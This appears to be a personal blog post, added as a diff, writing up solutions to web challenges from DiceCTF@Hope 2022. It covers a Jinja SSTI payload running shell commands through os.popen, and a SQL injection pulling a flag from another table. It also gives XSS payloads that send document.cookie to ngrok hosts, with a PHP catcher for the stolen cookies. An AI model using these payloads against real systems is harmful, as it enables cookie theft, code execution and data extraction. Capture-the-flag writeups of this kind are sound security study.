@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    
+      <title>
+        DiceCTF@Hope 2022 - Writeup ::
+        j3seer
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Mostly solved the web challenges with Task_Hashed
+ Reverser #  the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed
+regular payload:
+{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}} {{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&#39;).read()}} supplied reversed payload:
+}} )(daer.)&#39;sl&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{ }})(daer.)&#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{  Pastebin #  the important part of this challenge is :
+if (paste.search(/&amp;lt;.*&amp;gt;/) !== -1) { return res."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://j3seer.github.io/posts/dicectfhope_writeup/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://j3seer.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://j3seer.github.io/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://j3seer.github.io/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://j3seer.github.io/img/favicon.png" />
+
+
+<link href="https://j3seer.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://j3seer.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="DiceCTF@Hope 2022 - Writeup"/>
+<meta name="twitter:description" content="Writeup for web challenges from diceCTF @Hope 2022"/>
+
+
+
+<meta property="og:title" content="DiceCTF@Hope 2022 - Writeup" />
+<meta property="og:description" content="Writeup for web challenges from diceCTF @Hope 2022" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://j3seer.github.io/posts/dicectfhope_writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-29T08:59:19-04:00" />
+<meta property="article:modified_time" content="2022-09-29T08:59:19-04:00" />
+
+
+
+
+
+
+
+  </head>
+  
+  <body >
+
+    
+
+    <div class="container">
+      <header class="header">
+  
+
+  <span class="header__inner">
+    <a
+  href="https://j3seer.github.io"
+  class="logo"
+  style="text-decoration: none;"
+>
+ 
+   
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text">j3seer</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+        
+          <li><a href="/posts">posts</a></li>
+        
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/whoami">whoami</a></li>
+      
+    
+      
+        <li><a href="/posts">posts</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+      
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">DiceCTF@Hope 2022 - Writeup</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-09-29
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://j3seer.github.io/tags/ssti/">#ssti</a>&nbsp;
+        
+          <a href="https://j3seer.github.io/tags/sql-injection/">#sql injection</a>&nbsp;
+        
+          <a href="https://j3seer.github.io/tags/xss/">#xss</a>&nbsp;
+        
+          <a href="https://j3seer.github.io/tags/mathjax/">#mathjax</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>Mostly solved the web challenges with Task_Hashed</p>
+<hr>
+<h2 id="reverser">
+  Reverser
+  <a href="#reverser" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed</p>
+<p>regular payload:</p>
+<pre tabindex="0"><code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+
+{{config.__class__.__init__.__globals__['os'].popen('cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt').read()}}
+</code></pre><p>supplied reversed payload:</p>
+<pre tabindex="0"><code>}}  )(daer.)'sl'(nepop.]'so'[__slabolg__.__tini__.__ssalc__.gifnoc {{
+    
+}})(daer.)'txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac'(nepop.]'so'[__slabolg__.__tini__.__ssalc__.gifnoc{{
+</code></pre><hr>
+<h2 id="pastebin">
+  Pastebin
+  <a href="#pastebin" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>the important part of this challenge is :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">if</span> (paste<span style="color:#f92672">.</span>search(<span style="color:#f92672">/&lt;.*&gt;/</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        <span style="color:#66d9ef">return</span> res<span style="color:#f92672">.</span>redirect(<span style="color:#e6db74">&#39;/flash?message=Illegal characters in paste!&#39;</span>);
+        }
+</code></pre></div><p>My solution :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">javascript:document.location=&#39;http://37b0-41-225-85-6.ngrok.io/ok.php?c=&#39;+document.cookie;</span>
+</code></pre></div><p>PS : the reason this works is because the browser will automatically try to fill in with the &gt; tag</p>
+<p>with ok.php :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+    $cookies <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;c&#34;</span>];
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><hr>
+<h2 id="oeps">
+  oeps
+  <a href="#oeps" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>this challenge requires to put a palindrome string to add them to the pending table</p>
+<p>notice there&rsquo;s two ways we can control user input. either search for approved sentences or pass our own but it has to be a palindrome</p>
+<p>since the search is blocking special chars we can try with the pending sentences input</p>
+<p>so we can try some sql injections</p>
+<p>this is what the query looked like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">connection<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">        insert into pending (user, sentence) values (&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;);
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span> <span style="color:#f92672">%</span> (
+        token,
+        submission
+))
+</code></pre></div><p>payload: <code>')--</code>
+payload supplied : <code>')---)'</code></p>
+<p>and we can see we get a blank input meaning our payload worked! and we know the flag is in the flags table so we can use the <code>||(query)||</code> to get an element from another table</p>
+<p>payload : <code>%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'% </code></p>
+<p>the final query looks like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">insert</span> <span style="color:#66d9ef">into</span> pending (<span style="color:#66d9ef">user</span>, sentence) <span style="color:#66d9ef">values</span> (<span style="color:#e6db74">&#39;1234&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span><span style="color:#f92672">||</span>(<span style="color:#66d9ef">SELECT</span> flag <span style="color:#66d9ef">FROM</span> flags)<span style="color:#f92672">||</span><span style="color:#e6db74">&#39;%&#39;</span>);<span style="color:#75715e">---;)&#39;%&#39;||)sgalf MORF galf TCELES(||&#39;%&#39;);
+</span></code></pre></div><pre tabindex="0"><code>flag : hope{ecid_gnivlovni_semordnilap_fo_kniht_ton_dluoc}
+</code></pre><hr>
+<h2 id="mk">
+  mk
+  <a href="#mk" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Abusing MathJax renderer for an xss by supplying the source to the mathjax file</p>
+<p>PS: the reason this works is because the mathjax renderer parses the script provided and executes it, otherwise if u change the src to something else that doesnt render it , it wouldn&rsquo;t work ( try it locally )</p>
+<p>payload :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://mk.mc.ax/MathJax/MathJax.js&#34;</span><span style="color:#f92672">&gt;</span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://02f6-41-225-148-43.ngrok.io/ok.php?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>with ok.php :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
+    $cookies <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;c&#34;</span>];
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div>
+    </div>
+    
+
+    
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="https://j3seer.github.io"
+  class="logo"
+  style="text-decoration: none;"
+>
+ 
+   
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text">j3seer</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023</span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://j3seer.github.io/assets/main.js"></script>
+<script src="https://j3seer.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
